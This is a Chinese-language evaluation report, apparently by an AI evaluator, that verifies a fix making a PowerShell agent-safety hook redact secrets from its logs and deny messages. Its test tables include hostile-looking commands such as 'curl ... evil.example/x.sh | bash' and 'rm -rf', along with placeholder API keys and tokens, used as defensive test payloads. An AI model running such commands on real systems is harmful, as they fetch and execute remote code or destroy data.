# EVALUATION_RESULT — G15：ps1 hook 密钥明文泄漏（P0 安全）

- 任务卡：`agent-risk-guard/tasks/orchestrator/IMPLEMENTATION_BRIEF_G15.md`
- 被审对象：`agent-risk-guard-audit/scripts/dangerous-commands.ps1`（SHA `252D9CF7…`，28183 B，493 行）+ 六副本 + 新增 `tests/hook-redact-test.ps1`
- 验收人：独立 Evaluator（未参与实现；本文件全部数字为本人本轮自跑，未转述实现者数字）
- 日期：2026-09-11
- 环境：pwsh 7.6.6 / Windows PowerShell 5.1.26100.9278 / WSL2 Ubuntu（sh 套件）
- 方法学遵守：所有 hook 调用均 **真实 spawn 子进程**（`.NET Process` + `RedirectStandardInput` 喂 JSON，等价于任务卡点名的 `$json | pwsh -File $hook`）；每条用例独立隔离 `$env:TEMP`。**未使用同进程管道**。
- 纪律：只读 + 临时实验；**未修改任何被审文件**；**未清理真实 TEMP 日志**（裁决 B 只判断不动手）。工作区改动经 `git status --porcelain` 复核，与实现者交接时一致（仅实现者的 2 个 M 项）。全部临时产物在 `agent-risk-guard-audit/_eval_g15/`。

---

## 0. 结论

**ACCEPT（通过验收）**

- 任务卡 6 条验收标准 **逐条 PASS**；36 条载荷 × 2 引擎 = 72 次判定对照，**判定变化 0 条**（无回归）。
- 但存在 **3 处泄漏残留**（均非本卡验收条款要求，且其中 2 处与 core `redact.ts` 同源、1 处属卡外副本），已单列 §4，建议另立切片。
- 修正实现者自述中 **3 处与实测不符**的表述（§6），其中 §8.1 的「佐证泄漏已实际发生」证据链不成立。

---

## 1. 独立建立的基线（先证「改前」真身）

`agent-risk-guard-audit` 不是 git 仓库，故我用 `agent-risk-guard` 仓库的 **git HEAD** 独立取得改前快照（该仓库工作区里的两份副本正被 G15 修改，HEAD 即 G15 前状态）：

```
git -C agent-risk-guard show HEAD:assets/hooks/dangerous-commands.ps1  > before_raw.ps1
```

| 来源 | SHA256 | 大小 | BOM |
|---|---|---|---|
| git HEAD（我独立取得） | `D6D726D20288C2AFE602BE488D17A6C05F90DB1C46E4A78BC2E2A6A99FBCA9CA` | 24004 | EF BB BF |
| 实现者留档 `_g15_before_hook.ps1` | 同上 | 24004 | EF BB BF |
| 二者逐字节比对 | `SequenceEqual = True` | | |

**改前基线可信**：实现者的快照与仓库 HEAD **逐字节一致**，可作对照。

改后主源（我直接实测）：`252D9CF70F7839D98382FCD02FF6D9B4EC189E596BBE59A8178FBB28F177AECA` / 28183 B / 493 行 / BOM True。

---

## 2. 逐项验收

### 项 1 · 脱敏可证（allow 日志 + deny 回显）— **PASS**

方法：自建 `_eval_g15/probe.ps1`，36 条载荷 × {改前, 改后} × {PS5.1, pwsh7}，真实 spawn。以下为 **PS5.1 与 pwsh7 结果完全一致**（两份原始输出：`probe_powershell.txt` / `probe_pwsh.txt`、`probe_results_*.json`）。

**allow 路径 · 日志文件（`%TEMP%\riskguard-hook-calls.log`）**——要求「日志出现 `[REDACTED]` 且不出现原密钥」：

| 用例 | 类别 | 判定（前/后） | 改前日志（明文） | 改后日志 |
|---|---|---|---|---|
| A1 | `sk-proj-` + Bearer | allow/allow | `… Bearer sk-proj-AAAABBBBCCCCDDDDEEEEFFFF12345 …` | `curl -H "Authorization: Bearer [REDACTED]" https://api.example.com/v1/chat` |
| A2 | `sk-ant-` | allow/allow | `… Bearer sk-ant-abcdefghij0123456789xyzw …` | `curl -H "Authorization: Bearer [REDACTED]" https://api.anthropic.com/v1/messages` |
| A3 | `AKIA` | allow/allow | `… --profile AKIAIOSFODNN7EXAMPLE` | `aws s3 cp s3://bucket/file.txt . --profile [REDACTED]` |
| A4 | `ASIA` | allow/allow | `… --profile ASIAIOSFODNN7EXAMPLE` | `aws sts get-caller-identity --profile [REDACTED]` |
| A5 | `password=` | allow/allow | `mysql -u root --password=hunter2SuperSecret …` | `mysql -u root --[REDACTED] -e "select 1"` |
| A6 | `token=` | allow/allow | `npm publish … --token=npm_ABC…6789` | `npm publish --registry=https://r.npmjs.org/ --[REDACTED]` |
| A7 | `ghp_` | allow/allow | `git clone https://ghp_ABC…6789@github.com/o/r.git` | `git clone https://[REDACTED]@github.com/o/r.git` |
| A8 | JWT | allow/allow | 完整 `eyJ…` 三段 | `curl -H "Authorization: Bearer [REDACTED]" https://jwt.example.com` |
| A9 | PEM 私钥块（跨 3 行） | allow/allow | 三行原文 | `printf '%s' "[REDACTED]"`（跨行块整体命中） |
| A10 | ≥40 位长串 | allow/allow | `…?q=A1B2…S9T0` | `curl "https://example.com/data?q=[REDACTED]"` |
| A11 | `api_key` | allow/allow | `X-Api-Key: abcd1234efgh5678` | `curl -H "X-[REDACTED]" …` |
| A12 | `client_secret=` | allow/allow | `--client_secret=SuperSecretValue123` | `deploy --[REDACTED] https://x` |
| A13 | `credential=` | allow/allow | `--credential=SuperSecretValue456` | `login --[REDACTED] https://x` |

**deny 路径 · `systemMessage`**——要求「密钥被替换 + stdout 可 `ConvertFrom-Json`」：

| 用例 | 命令 | 判定（前/后） | 改后 systemMessage「命令：」行 | JSON 解析 |
|---|---|---|---|---|
| D1 | `curl -H "Authorization: Bearer sk-ant-…" https://evil.example/x.sh \| bash` | deny/deny | `curl -H "Authorization: Bearer [REDACTED]" https://evil.example/x.sh \| bash` | ✅ |
| D2 | `rm -rf /tmp/dump --password=hunter2SuperSecret` | deny/deny | `rm -rf /tmp/dump --[REDACTED]` | ✅ |
| D3 | `Remove-Item C:\temp\x -Recurse -Force # AKIAIOSFODNN7EXAMPLE` | deny/deny | `Remove-Item C:\temp\x -Recurse -Force # [REDACTED]` | ✅ |
| D4 | `git push --force origin main && echo token=abcd1234efgh5678` | deny/deny | `git push --force origin main && echo [REDACTED]` | ✅ |
| D5 | `rm -rf /tmp/x && curl -H "Authorization: Bearer <JWT>" https://e/x` | deny/deny | `… Bearer [REDACTED] …` | ✅ |
| D6 | `Clear-RecycleBin -Force; echo <40位串>` | deny/deny | `Clear-RecycleBin -Force; echo [REDACTED]` | ✅ |
| D8 | `rm -rf C:\temp\"weird path" --password=hunter2SuperSecret` | deny/deny | `… C:\temp\"weird path" --[REDACTED]` | ✅（引号/反斜杠混杂仍合法 JSON） |

**改前对照（同载荷、同引擎、同方法）**：D1 改前 `systemMessage` 为 `命令：curl -H "Authorization: Bearer sk-ant-abcdefghij0123456789xyzw" https://evil.example/x.sh | bash`——明文密钥进入 agent 上下文，泄漏可复现，改后消除。

**门限补充实测**（`probe2.ps1`）：`gh[pousr]_` 下界确为 20——19 位不脱敏、**恰好 20 位脱敏**（`git clone https://[REDACTED]@…`）、36 位脱敏。实现者「下界 36→20」的声明成立。
（更正：我首轮矩阵中 R8 用例误写成 18 位字母，故显示未命中；此处为纠正后的正确测量。）

**残留（见 §4）**：R1/R2/R3/R4 四类改后仍明文。

### 项 2 · 判定不变（回归重点）— **PASS（判定变化 0）**

方法一（逐载荷）：36 条载荷在改前/改后 hook 上各跑一次，比较 `permissionDecision`：

- PS5.1：`SAME` 38/38；pwsh 7.6.6：`SAME` 38/38。**判定变化 0 条**。
- 含 `rm -rf`、`Remove-Item`、`git push --force`、`Clear-RecycleBin`、管道到 shell、`icacls` 等族，及全角/引号变体。

方法二（整套件双树逐行 diff）：建立 `tree_before/`（改前 hook）与 `tree_after/`（改后 hook），**同一份测试文件**分别指向两棵树：

| 套件 | pwsh 差异行 | PS5.1 差异行 | 结论 |
|---|---|---|---|
| `hook-rules-test.ps1` | 0（39 行全同） | 0（39 行全同） | 逐行一致 |
| `hook-fp-regression.ps1` | 0（10 行全同） | 0（10 行全同） | 逐行一致 |
| `hook-bypass-regression.ps1` | 2（均为 PS 报错信息里的**绝对树路径**） | 4（同上） | 判定数字同为 20/20、18/18 |
| `hook-audit-reregress.ps1` | 0（2 行全同） | 0 | 逐行一致 |

方法三（JSON 契约）：8 条 deny 用例的原始 stdout 逐字段比对——顶层键集合、`hookSpecificOutput` 键集合、`permissionDecision`、`hookEventName`、`updatedInput = null`、`permissionDecisionReason` **全部逐字相同**，`契约不一致用例数 = 0`（`json-contract.ps1`）。

### 项 3 · 无误伤 — **PASS**

`echo hello` / `git status` / `ls -la`，双引擎各跑：日志 `reason=` 后内容与输入 **`-ceq` 逐字相等**，且 `改前 == 改后`：

```
powershell.exe [echo hello] after='echo hello' verbatim=True | before==after=True | stdoutA.len=0
powershell.exe [git status] after='git status' verbatim=True | before==after=True | stdoutA.len=0
powershell.exe [ls -la]     after='ls -la'     verbatim=True | before==after=True | stdoutA.len=0
pwsh.exe       [同三条]      verbatim=True | before==after=True
```

另测 `npm run build --prefix packages/core`、`Get-ChildItem C:\Users\Public`、`echo "hello world"`、`cd E:\…\2026_08_21` 均逐字未变、无 `[REDACTED]`。allow 路径 stdout 长度为 0（原本就不回显）。

### 项 4 · 测试真实性（新套件对改前 hook 必须变红）— **PASS**

把 `hook-redact-test.ps1`（未改一字）放进双树运行：

| 树 | pwsh 7.6.6 | PS5.1 | 退出码 |
|---|---|---|---|
| **tree_before（改前 hook）** | **PASS: 29/59（exit 1）** | **PASS: 29/59（exit 1）** | 1 = 变红 ✅ |
| tree_after（改后 hook） | **PASS: 60/60（exit 0）** | **PASS: 60/60（exit 0）** | 0 = 变绿 ✅ |

改前失败项正是被修复的缺陷本身（原始输出 `suiteout_hook-redact-test_*_tree_before.txt`），节选：

```
FAIL  allow-log  [Authorization: Bearer + sk-proj-] 日志出现 [REDACTED]   <- log=…reason=curl -H "Authorization: Bearer sk-proj-AAAABBBBCCCCDDDDEEEEFFFF12345" https://api.example.com
FAIL  allow-log  [AWS AKIA] 日志无明文密钥   <- log=…--profile AKIAIOSFODNN7EXAMPLE
FAIL  allow-log  [JWT eyJ...] 日志无明文密钥  <- log=…Bearer eyJhbGciOiJIUzI1NiJ9.…
FAIL  deny-echo  [Bearer sk-ant- + 管道 shell] systemMessage 无明文密钥
FAIL  logcap      当前日志 <= 上限(1024)   <- curLen=1494
FAIL  logcap      超限后已轮转出 .1        <- no …\cap\riskguard-hook-calls.log.1
```

（该套件 60 条 = allow 10×3 + deny 4×5 + 无误伤 5 + 上限 3 + 写盘失败 2；改前因 `.1` 不存在跳过 1 条，故 59。计数自洽。）

### 项 5 · BOM + 六副本 SHA256 — **PASS**

| # | 路径 | SHA256（前 12） | size | BOM(EF BB BF) | Redact | LogCap |
|---|---|---|---|---|---|---|
| 1 | `agent-risk-guard-audit/scripts/dangerous-commands.ps1` | `252D9CF70F78` | 28183 | ✅ | ✅ | ✅ |
| 2 | `agent-risk-guard/assets/hooks/dangerous-commands.ps1` | `252D9CF70F78` | 28183 | ✅ | ✅ | ✅ |
| 3 | `agent-risk-guard/skills/agent-risk-guard/scripts/dangerous-commands.ps1` | `252D9CF70F78` | 28183 | ✅ | ✅ | ✅ |
| 4 | `~/.claude/hooks/dangerous-commands.ps1` | `252D9CF70F78` | 28183 | ✅ | ✅ | ✅ |
| 5 | `~/.codex/hooks/dangerous-commands.ps1` | `252D9CF70F78` | 28183 | ✅ | ✅ | ✅ |
| 6 | `~/.gemini/config/hooks/dangerous-commands.ps1` | `252D9CF70F78` | 28183 | ✅ | ✅ | ✅ |

**六份全同**（`252D9CF70F7839D98382FCD02FF6D9B4EC189E596BBE59A8178FBB28F177AECA`），全部 493 行、前 3 字节 `EF BB BF`。
改前状态：主源与仓库内 2 份可由 git HEAD 独立确认为 `D6D726D2…`（我实测）；4 份安装副本的改前状态**未能独立取证**（无备份），但当前 6 份一致且 PS5.1 下四套件全绿，可证 BOM 有效。

### 项 6 · 回归（四套 ps1 + 三套 sh）— **PASS**

ps1（本轮自跑，隔离 TEMP）：

| 套件 | pwsh 7.6.6 | PS5.1 | 期望 |
|---|---|---|---|
| `hook-rules-test.ps1` | **37/37** | **37/37** | 37 ✅ |
| `hook-fp-regression.ps1` | **8/8** | **8/8** | 8 ✅ |
| `hook-bypass-regression.ps1` | **20/20** | **18/18** | 20 / 18（PS5.1 既有债，首行非注释无 BOM）✅ |
| `hook-audit-reregress.ps1` | **59/59** | **59/59** | 59 ✅ |
| `hook-redact-test.ps1`（新增） | **60/60** | **60/60** | 新增 ✅ |

sh（WSL Ubuntu 自跑；`dangerous-commands.sh` mtime 仍为 2026-09-10 09:04:12 / 15522 B，未被触碰）：

```
tests/sh-hook-test.sh      PASS: 67/67            exit=0
tests/sh-audit-edge.sh     TOTAL: 40 PASS: 40 FAIL: 0   exit=0
tests/sh-audit-bypass.sh   TOTAL: 192 PASS: 192 FAIL: 0  ALL PASS  exit=0
```

与基线 67 / 40 / 192 一致。

### 补充项 · 日志卫生（任务卡验收标准 4，非交付清单点名，我仍实测）— **PASS（有一处边界）**

- 上限生效：`RG_HOOK_LOG_MAX_BYTES=1024` 连写 20 条 → 当前日志 **528 B ≤ 1024**，`.1` 已生成 **969 B ≤ 1024**。
- `RG_HOOK_LOG_MAX_BYTES=0` → 不限（1494 B，无 `.1`）。
- 写盘失败静默降级：TEMP 指向不存在目录 → `echo hello` 仍 allow、`rm -rf /tmp/x` 仍 deny，退出码 0，**stderr 长度 0/0**（无异常外泄）。
- **边界（已知限，非验收项）**：单条命令本身超过上限时会被整条写入（实测 3005 字符命令 → 日志 3067 B > 1024）。轮转只按「写入前大小」判断，故上限是「稳态有界」而非「绝对有界」。命令长度有上限，实际影响有限。

### 三端模式对齐（我独立复核）

- core 侧：从 `agent-risk-guard/packages/core/src/redact.ts` **实抽** 10 条模式（node `eval` 抽取原文），对同一 36 条语料跑 `redactSecrets`；ps1 侧取 hook allow 路径日志中的真实输出。**allow 路径一致 26/36，差异全部是 ps1「只增不减」**：
  - `A6 token=`：core 只把值（40 位）替换，ps1 把整个 `--token=…` 替换（ps1 更严，源自补入的裸 `token` 备选）。
  - `A13 credential=`：core 不覆盖（明文残留），ps1 覆盖（照 sh 补入 `credential`）。
  - 即实现者「较 core 三处只增不减」的说法**核实成立**（gh 下界 20、裸 `token`、`credential`）。
- sh 侧：从 `dangerous-commands.sh` L90-96 逐字节抽出 `redact_cmd` 实跑同批载荷，**ps1 覆盖面严格强于 sh**：
  - sh 会泄漏 `sk-proj-…`（其 `sk-[A-Za-z0-9]{16,}` 因 `-` 不匹配）、泄漏 JWT、泄漏 ≥40 位长串；ps1 三者均脱敏。
  - 二者共同未覆盖：`aws_secret_access_key`、`--password="带 空格"`、`mysql -p<pass>`、`curl -u user:pass`。

---

## 3. 五项裁决

### A. 轮转用 `Move-Item -Force` 覆盖 `.1`（销毁旧 `.1`）——**可接受，不必改**

实测证据（`probe4.ps1`）：预置 `riskguard-hook-calls.log.1 = "SENTINEL-OLD-DOT-ONE"` → 触发轮转后 **哨兵消失**，`.1` 被当前日志覆盖（1102 B）。行为与实现者描述一致。

判定**可接受**，理由：
1. 该文件是 **hook 自管的 TEMP 运行日志**（`%TEMP%\riskguard-hook-calls.log`），不是用户数据、不是项目产物；删除铁律的立法目的是「不销毁用户文件」。
2. 任务卡 §理想行为 4 明确写「截断/轮转或截断策略」，且 §8 已请 Evaluator 确认——**卡本身授权了轮转**。
3. 两个替代方案代价更高：① 时间戳命名 → 文件数无界，与「避免长期累积」目标冲突；② 走回收站 → 需在 hook 内引入 `Microsoft.VisualBasic` / COM 调用，而该 hook 是每次工具调用都执行的**安全关键路径**，任何新增依赖都可能让 hook 抛错（比覆盖旧日志危险得多）。
4. 内容本身已脱敏，旧 `.1` 无额外取证价值。

建议（不构成本次卡顿）：在主源注释补一句「轮转即覆盖旧 `.1`」，并可选升级为 `.1`/`.2` 双槽轮转以保留一代历史。

### B. 历史日志已含明文密钥 → 清理是否属本切片必须 ——**不属本切片必须；且实现者引用的「佐证」证据链不成立**

我**未清理**该文件（遵守纪律），只做统计与去密钥化骨架。

真实日志实况（我实测）：`%TEMP%\riskguard-hook-calls.log`，勘验时 **879,737 B / 6,475 行**（实现者报告时 819,657 B / 5,989 行；本会话期间仍有 agent 在写，属正常活跃，非我污染——我所有实验均用隔离 TEMP 子目录）。覆盖时间 2026-09-03 02:12 → 2026-09-11 09:52。

按写入时间分桶（分界点 = 六副本写回时刻 **2026-09-11 09:24**）：

| 类别 | 总命中 | 改前(<09:24) | 改后(≥09:24) |
|---|---|---|---|
| AKIA/ASIA | 1 | **0** | 1 |
| `gh[pousr]_` | 1 | **0** | 1 |
| `sk-…` | 1 | **0** | 1 |
| `password=` | 1 | **0** | 1 |
| `Authorization: Bearer/Basic` | 2 | **0** | 2 |
| JWT / PEM / api_key | 0 | 0 | 0 |
| `[REDACTED]` 标记 | 5 | **0** | 5 |
| ≥40 长串 | 18 | 13 | 2（+3 无时间戳） |

**决定性证据**：那 6 行明文全部落在 **09:32:36** 同一秒，去密钥化骨架显示它们是**测试夹具**，且紧邻出现改后 hook 的同命令脱敏版：

```
[行5911] 2026-09-11 09:32:36 … decision=allow reason=curl -H "Authorization: Bearer <SK>" https://api.example.com
[行5912] 2026-09-11 09:32:36 … decision=allow reason=curl -H "Authorization: Bearer [REDACTED]" https://api.example.com
[行5913] 2026-09-11 09:32:36 … reason=mysql -u root --<PWD>… 
[行5915] 2026-09-11 09:32:36 … reason=aws s3 cp s3://b/f . --profile <AKIA>
[行5917] 2026-09-11 09:32:36 … reason=git clone https://<GH>@github.com/o/r.git
[行5919] 2026-09-11 09:32:36 … reason=npm publish --token=<LONG40>
```

时间点与实现者 `_g15_decision_diff.txt`（09:32:38）吻合，命令即其 A/B 镜像树的测试载荷。**即：真实日志中的明文凭据不是「真实使用泄漏」，而是实现者自己的改前镜像树测试把明文写进了真实 TEMP**（该脚本未隔离 TEMP）。
改前 ≥40 命中的 13 行经去密钥化核对为 **良性长串**（会话 UUID 目录名、`rollout_summaries\<uuid>.md`、PDF 文件名、rg 模式串），无凭据。

结论：
1. 「G15 在真实使用中已产生落地泄漏」在本机日志中**无证据支持**——真正的证据是「代码路径一旦被含密钥命令走到就会明文落盘」（我用改前 hook 已直接复现，这一条成立且足够支撑 P0）。
2. 因此清理历史日志 **不属本切片必须**：它不是本卡交付物，且依赖「进回收站 + 用户确认」的删除铁律流程，属用户决策。
3. 建议后续（用户确认后）用回收站方式清理该文件与 `~/.codex/hooks/hook-calls.log`（199 B，2026-08-23，内容无凭据）；同时建议给实现者/后续脚本加一条纪律：**A/B 对照脚本必须隔离 TEMP**，否则自身就是泄漏源。

### C. ≥40 位长串误伤 ——**可接受，本轮不改阈值**

实测（改后 hook）：`docker pull alpine@sha256:e3b0c442…b855`（64 位）在日志中变为 `docker pull alpine@sha256:[REDACTED]`；40 位 git SHA 同理；39 位不命中（阈值边界正确）。

判定**可接受**，理由：
1. 该启发式是 **core `redact.ts` 既有模式（第 10 条）**，本卡目标之一是「与 core 语义一致」；单方面调高 ps1 阈值会造成新的三端分叉，与本卡「三端同源」纪律冲突。
2. 误伤只影响**日志/回显可读性**，不改变判定（已证 0 回归），也不阻断任何命令。
3. 任务卡点名的三条误伤对照（`echo hello`/`git status`/`ls -la`）不受影响，已逐字验证。

建议（后续，统一在 core 层做，三端一起改）：对 `sha256:`/`@sha256:`、`/blob/<40hex>` 等已知非密钥前缀加白名单，或把「长随机串」细化为「高熵判定（字符集混合度）+ 长度 ≥40」。

### D. 第七份变体 `agent-risk-guard-audit-xhs-publish/scripts/dangerous-commands.ps1`（`0B836D6D…`）——**同根因的真实泄漏面，但非本切片必须**

实测（真实 spawn，改前/改后均如此，`probe3.ps1`）：

```
[XHS deny 用例] 判定=deny   stdout 含明文密钥=True   stdout 含[REDACTED]=False
[XHS allow 用例] 判定=allow  日志含明文密钥=True  日志含[REDACTED]=False
   日志: …decision=allow reason=curl -H "Authorization: Bearer sk-ant-abcdefghij0123456789xyzw" https://api.example.com
```

即：**同根因、确实泄漏、无脱敏、无上限**（401 行 / 21466 B / BOM，`Write-HookLog` L33、allow 落盘 L400、`systemMessage` 内嵌 `$script:curCmd`）。

但判定**非本切片必须**，理由：
1. 它不在任务卡 §涉及模块 的六副本清单内，且**与 canonical 本就是不同血缘**（`0B836D6D ≠ 252D9CF7`，401 行 vs 493 行），不能按字节复制同步——同步它等于替另一个产物做一次规则合并。
2. **本机无活线**：全盘普查（`census2.ps1`）显示 `~/.claude/hooks`、`~/.codex/hooks`、`~/.gemini/config/hooks` 内**只有** `dangerous-commands.ps1`（=canonical）与 agy 适配器；配置文件（`~/.codex/hooks.json`、`~/.codex/config.toml`、`~/.gemini/config/hooks.json` → `agy-dangerous-commands.ps1` → 主源）均未引用 xhs 目录。G4 验收（`IMPLEMENTATION_RESULT_G4.md` §1.2 相邻段）已就同一文件作过同样判定（「另一状态的发布快照而非活镜像」），本卡沿用该口径。
3. T8b 任务卡提到的交付目录 `E:\Code_file\Claude_code\2026\08\22\agent-risk-guard-audit-skill\` **当前不存在**（我实测），故没有「已发布的带毒产物」正在分发。

风险与建议：若该快照会被重新发布，则泄漏会随包分发。**建议另立切片**「ps1 单源收敛（universal + xhs-publish + test/）」：统一由一个生成/同步脚本从 canonical 派生，而不是逐份手改。

**结论：任务卡范围确实划小了一点（对 xhs 而言是「快照血缘」问题，不是遗漏的活线），但按卡的定义它不构成本卡 FAIL。**

### E. `dangerous-commands-universal.ps1` 的 `Write-HookLog` / 回显 ——**同根因；且实现者对其「无回显」的描述有误**

**先更正事实**：实现者 §8.3 写「其 `Write-HookLog` 同样无脱敏（**但无 `curCmd` 回显**）」。实测不成立——该文件的 `Deny-Command` 用的是 `$cmd`（而非 `$script:curCmd`），效果相同：

```powershell
systemMessage = "⛔ HOOK 已拦截危险命令：$reason`n命令：$cmd`n如确需执行，请在 Claude Code 外部手动操作。"
```

真实 spawn 结果（`probe3.ps1`）：

```
[UNIVERSAL deny 用例] 判定=deny   stdout 含明文密钥=True   stdout 含[REDACTED]=False
[UNIVERSAL allow 用例] 判定=allow  日志含明文密钥=True  日志含[REDACTED]=False
```

即 **allow 落盘泄漏 + deny 回显泄漏两者皆有**，与 G15 完全同根因。普查结果：该文件存在 **2 份同 hash 副本**（`13FEB6CC…`，17685 B：`agent-risk-guard-audit/scripts/` 与 `agent-risk-guard/skills/agent-risk-guard/scripts/`），另有 xhs 目录下已漂移的 `9BB6374D…`（17739 B）与 `test/dangerous-commands-universal.ps1`（`4C9EA52C…`，7846 B，2026-08-23 旧版）。

判定**非本切片必须，但优先级 P1**：
- 它是 `SKILL.md:74` 明确列出的**分发资产**（「Cursor / Goose / Grok / Hermes / Copilot → 复制到 hooks/ + 注册 hooks.json」），一旦被这些 agent 采用即成为活线；本机普查未见安装副本，故当前无活线。
- 它与 canonical **规则集已漂移**（354 行 vs 493 行，G4 曾单独修过其 L216），无法字节同步，必须按内容合并 → 属「单源收敛」议题，不属 G15。
- 建议：与 D 合并为同一后续切片，优先级高于 D（因为 universal 是面向 5+ agent 的分发件）。

---

## 4. 泄漏残留清单（改后仍未脱敏的路径）

按严重度排序。**均不改变本轮「判定不变、无回归」的结论**。

| # | 残留路径 | 证据 | 与 core 关系 | 建议 |
|---|---|---|---|---|
| R1 | `aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`（allow） | 改后日志仍为明文（PS5.1+pwsh7 均复现）；core 同样未覆盖；sh 亦未覆盖 | = core 同缺口 | **任务卡 §用户场景 1 点名的场景**，却未被任何模式覆盖。建议立切片：core 增 `secret[_-]?access[_-]?key` / 空格分隔的裸键值，三端同步 |
| R2 | `--password="hunter2 SuperSecret"`（allow 与 deny 均泄） | 改后日志/systemMessage/stdout 均含明文（值含空格时 `[^\s''",;}\]]+` 无法整段捕获） | = core 同缺口 | 同上，随 R1 一并修；属已知启发式边界 |
| R3 | `mysql -u root -phunter2SuperSecret` | 改后仍明文 | = core/sh 同缺口 | 非键值形态，需专门的 `-p<value>` 规则，优先级低 |
| R4 | `curl -u admin:hunter2SuperSecret https://…` | 改后仍明文 | = core/sh 同缺口 | URL userinfo 形态，优先级低 |
| R5 | `agent-risk-guard-audit-xhs-publish/scripts/dangerous-commands.ps1`（`0B836D6D`，401 行） | deny 回显 + allow 日志均明文（实测） | 卡外副本，血缘漂移 | 见裁决 D |
| R6 | `dangerous-commands-universal.ps1`（`13FEB6CC` ×2 + `9BB6374D` ×1） | deny 回显 + allow 日志均明文（实测） | 卡外分发资产，规则集漂移 | 见裁决 E（P1） |

另注：`sk-…`/JWT/≥40 位三类在 **sh** 侧仍泄漏（ps1 已修），三端覆盖面不对齐（ps1 ⊃ sh）。若要「三端同源」，应在后续把 core 的 10 条模式**下沉**到 sh，而不是削 ps1。

---

## 5. 是否存在回归 / 泄漏残留（任务要求的特别标注）

- **回归（判定变化）：无。** 38 载荷 × 2 引擎判定全同；四套既有套件双树逐行 diff，除 PS 报错文本中的绝对路径外 0 差异；8 条 deny 的 JSON 字段与 `permissionDecisionReason` 逐字相同；三套 sh 套件 67/40/192 未动。
- **泄漏残留：有，6 条**（§4）。其中真正属于「本卡应覆盖而未覆盖」的是 **R1**（用户场景点名）与 **R2**（`password=` 类的一种形态）；R5/R6 是卡外同根因副本；R3/R4 是启发式边界。

---

## 6. 实现者自述与实测不符之处（3 处）

1. **§8.1「历史日志含 5 处明文密钥……这佐证 G15 在真实使用中已产生落地泄漏」——证据链不成立。**
   实测：该日志 09:24 之前的全部 6,469 行中，AKIA/Bearer/`sk-`/`password`/`gh` **命中数为 0**；被点名的 6 行明文全部写于 **09:32:36**，即**实现者自己改前镜像树 A/B 对照脚本**写入真实 TEMP 的测试夹具（紧邻的下一行就是改后 hook 对同命令的 `[REDACTED]` 输出）。改前 ≥40 命中 13 行经去密钥化核对为会话 UUID/文件名等良性长串。
   → 「泄漏可能发生」由**改前 hook 的可复现行为**证明（我已复现），但**不是**由该日志证明；且实现者脚本本身污染了真实日志（未隔离 TEMP）。

2. **§8.3「universal … 但无 `curCmd` 回显」——不成立。** 该文件用 `$cmd` 回显，实测 deny 的 `systemMessage` 与 allow 日志均含明文密钥（§裁决 E）。

3. **§8.7/§2.3 对 ≥40 误伤的描述正确但未给出实例**；我补充实例：64 位 `sha256:` 摘要与 40 位 git SHA 均被替换（裁决 C）。

其余自述（改前 `D6D726D2` / 改后 `252D9CF7`、六副本一致、BOM、493 行、判定 40/40 一致、四套件 37/20/8/59 与 PS5.1 18、sh 67/40/192、新套件改前 29/59 改后 60/60、`RG_HOOK_LOG_MAX_BYTES` 上限与静默降级、模式对齐 core 的「只增不减」三处差异）**均与我的独立实测一致**。

---

## 7. 复现方式（全部落档 `agent-risk-guard-audit/_eval_g15/`）

```powershell
# 0) 改前基线（独立于实现者）
cmd /c "git -C <repo> show HEAD:assets/hooks/dangerous-commands.ps1 > before_hook.ps1"   # → D6D726D2…，与实现者快照逐字节一致
Copy-Item <audit>\scripts\dangerous-commands.ps1 after_hook.ps1                          # → 252D9CF7…

# 1) 载荷矩阵 + 判定不变（真实 spawn，隔离 TEMP，双引擎）
pwsh -File probe.ps1 -Engine powershell.exe    # 38 载荷，输出 probe_powershell.txt / probe_results_powershell.json
pwsh -File probe.ps1 -Engine pwsh.exe
pwsh -File probe2.ps1                          # 门限/上限/轮转/写盘失败/无误伤逐字
pwsh -File probe4.ps1                          # 单条超大行；轮转销毁 .1 哨兵；生产日志 [REDACTED] 时间分布
pwsh -File json-contract.ps1                   # deny JSON 契约逐字段

# 2) 双树 × 双引擎 × 五套件
pwsh -File run-suites.ps1                      # suiteout_*.txt / suite_summary.txt（tree_before 的 redact 套件应为 29/59 exit=1）

# 3) 三端对齐
node parity_core.mjs                           # core redact.ts 实抽 vs ps1 实测
wsl -- bash <...>/sh_redact_probe.sh           # sh redact_cmd 逐字节抽取 + 同批载荷

# 4) 卡外副本与普查
pwsh -File probe3.ps1                          # xhs / universal 泄漏实测 + 配置文件接线
pwsh -File census2.ps1                         # 全副本 SHA/BOM/Redact/Echo 普查
pwsh -File log-audit.ps1 ; pwsh -File log-time.ps1 ; pwsh -File masked-sample.ps1   # 真实日志统计（只统计+去密钥化骨架）

# 5) 回归
wsl -- bash <...>/run-sh-suites.sh             # 67/40/192
```

纪律声明：未修改任何被审文件；未删除/清理任何日志；临时实验目录均置于隔离 `$env:TEMP` 子目录；`_eval_g15/` 为新增目录，不改动他人产物。
